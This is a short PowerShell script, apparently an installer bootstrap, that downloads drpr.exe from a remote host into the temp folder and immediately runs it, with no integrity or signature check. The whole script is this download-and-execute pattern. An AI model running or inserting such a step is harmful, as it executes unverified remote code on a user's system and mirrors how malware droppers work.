$url = "https://dreditorcn.genouka.top/drpr.exe"
$tempDir = [System.IO.Path]::GetTempPath()
$localFile = Join-Path $tempDir "drpr.exe"
try {
    $client = New-Object System.Net.WebClient
    $client.DownloadFile($url, $localFile)
    Start-Process -FilePath $localFile
} catch {
    Write-Error "ERROR: $_"
    exit 1
}